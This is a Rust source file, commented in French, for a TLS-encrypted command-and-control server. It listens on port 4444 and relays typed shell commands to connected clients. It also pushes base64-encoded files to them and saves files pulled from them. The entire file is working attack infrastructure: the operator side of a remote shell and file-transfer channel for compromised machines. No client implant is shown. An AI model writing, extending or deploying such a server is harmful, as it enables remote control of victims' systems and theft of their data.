use std::fs::File;
use std::io::{self, Read, Write, BufRead};
use std::net::TcpListener;
use native_tls::{Identity, TlsAcceptor};
use std::thread;
use std::sync::Arc;
// Import pour l'encodage des fichiers en texte
use base64::{Engine as _, engine::general_purpose};

fn main() {
    println!("Démarrage du Serveur C2 en Rust...");

    // ------------------------------------------------------------------
    // 1. CONFIGURATION TLS (CERTIFICAT)
    // ------------------------------------------------------------------
    let mut file = File::open("identity.pfx").expect("ERREUR: 'identity.pfx' introuvable !");
    let mut identity_bytes = vec![];
    file.read_to_end(&mut identity_bytes).unwrap();
    
    let identity = Identity::from_pkcs12(&identity_bytes, "password").expect("Mauvais mot de passe PFX !");
    let acceptor = TlsAcceptor::new(identity).unwrap();
    let acceptor = Arc::new(acceptor); // Arc permet de partager l'acceptor entre les threads

    // ------------------------------------------------------------------
    // 2. ÉCOUTE RÉSEAU
    // ------------------------------------------------------------------
    let listener = TcpListener::bind("0.0.0.0:4444").unwrap();
    println!("[*] En écoute sur le port 4444 (TLS)...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let acceptor = acceptor.clone();
                
                // On lance un nouveau Thread pour chaque client
                thread::spawn(move || {
                    println!("[*] Connexion entrante...");
                    
                    // Handshake TLS
                    match acceptor.accept(stream) {
                        Ok(mut stream) => {
                            println!("[+] Client connecté et sécurisé (TLS) !");

                            loop {
                                // ------------------------------------------------------------------
                                // A. LECTURE DE LA COMMANDE (CLAVIER)
                                // ------------------------------------------------------------------
                                print!("Shell> ");
                                io::stdout().flush().unwrap();
                                
                                let mut command = String::new();
                                io::stdin().read_line(&mut command).unwrap();
                                let command = command.trim(); // Nettoyage (retrait du \n)

                                if command.is_empty() { continue; }
                                if command == "exit" { 
                                    println!("[-] Fermeture de la session.");
                                    break; 
                                }

                                // ------------------------------------------------------------------
                                // B. PRÉPARATION DE LA COMMANDE (LOGIQUE UPLOAD)
                                // ------------------------------------------------------------------
                                // Par défaut, on envoie la commande telle quelle
                                let mut final_command = command.to_string();
                                let mut skip_sending = false;

                                // Si c'est un UPLOAD, on doit lire le fichier local et l'encoder
                                if command.starts_with("upload") {
                                    let parts: Vec<&str> = command.split_whitespace().collect();
                                    if parts.len() >= 2 {
                                        let local_path = parts[1];
                                        // Si pas de nom distant précisé, on garde le même
                                        let remote_name = if parts.len() > 2 { parts[2] } else { local_path };
                                        
                                        println!("[*] Préparation de l'envoi de '{}'...", local_path);
                                        
                                        match std::fs::read(local_path) {
                                            Ok(content) => {
                                                // Encodage en Base64
                                                let b64 = general_purpose::STANDARD.encode(&content);
                                                // On remplace la commande par : upload <BASE64> <NOM_DISTANT>
                                                final_command = format!("upload {} {}", b64, remote_name);
                                                println!("[+] Fichier lu et encodé ({} octets).", content.len());
                                            },
                                            Err(e) => {
                                                println!("[-] Erreur lecture fichier local: {}", e);
                                                skip_sending = true; // On n'envoie rien au client
                                            }
                                        }
                                    } else {
                                        println!("[-] Usage: upload <fichier_local> [nom_distant]");
                                        skip_sending = true;
                                    }
                                }

                                if skip_sending { continue; }

                                // ------------------------------------------------------------------
                                // C. ENVOI AU CLIENT
                                // ------------------------------------------------------------------
                                // On ajoute \n car le client lit avec read_line()
                                if let Err(e) = stream.write_all(format!("{}\n", final_command).as_bytes()) {
                                    println!("[-] Client déconnecté lors de l'envoi: {}", e);
                                    break;
                                }

                                // ------------------------------------------------------------------
                                // D. RÉCEPTION DE LA RÉPONSE
                                // ------------------------------------------------------------------
                                let mut buffer = [0; 65536]; // Buffer de 64KB
                                match stream.read(&mut buffer) {
                                    Ok(n) => {
                                        if n == 0 { 
                                            println!("[-] Le client a fermé la connexion.");
                                            break; 
                                        }
                                        
                                        // Si la commande originale était DOWNLOAD, on sauvegarde
                                        if command.starts_with("download") {
                                            let parts: Vec<&str> = command.split_whitespace().collect();
                                            if parts.len() >= 2 {
                                                let filename = parts[1];
                                                println!("[*] Réception du fichier '{}' ({} octets)...", filename, n);
                                                
                                                match File::create(filename) {
                                                    Ok(mut file) => {
                                                        // On écrit les octets bruts
                                                        file.write_all(&buffer[0..n]).unwrap();
                                                        println!("[+] Fichier téléchargé avec succès !");
                                                    },
                                                    Err(e) => println!("[-] Erreur écriture disque: {}", e),
                                                }
                                            }
                                        } else {
                                            // Sinon, on affiche le texte reçu
                                            let response = String::from_utf8_lossy(&buffer[0..n]);
                                            println!("{}", response);
                                        }
                                    },
                                    Err(e) => {
                                        println!("[-] Erreur de lecture réponse: {}", e);
                                        break;
                                    }
                                }
                            }
                        },
                        Err(e) => println!("[-] Échec Handshake TLS: {}", e),
                    }
                });
            }
            Err(e) => println!("[-] Erreur connexion TCP: {}", e),
        }
    }
}